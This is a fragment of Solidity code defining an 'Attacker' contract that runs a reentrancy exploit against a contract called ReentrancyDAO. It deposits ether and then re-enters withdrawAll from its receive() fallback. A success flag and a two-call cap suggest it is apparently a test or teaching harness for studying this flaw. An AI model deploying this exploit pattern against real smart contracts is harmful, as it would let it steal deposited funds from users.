}

contract Attacker {
    ReentrancyDAO public victimContract;

    uint256 public reentrancyCount;
    bool public exploitSucceeded;
    uint256 public attackValue;

    constructor(address victimAddress) {
        victimContract = ReentrancyDAO(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        reentrancyCount = 0;
        exploitSucceeded = false;
        attackValue = val;
        victimContract.deposit{value: val}();
    }

    function attack(uint256 val) public {
        attackValue = val;
        victimContract.withdrawAll();
        exploitSucceeded = reentrancyCount > 1;
    }

    receive() external payable {
        reentrancyCount++;
        if (reentrancyCount < 2) {
            victimContract.withdrawAll();
        }
    }
}
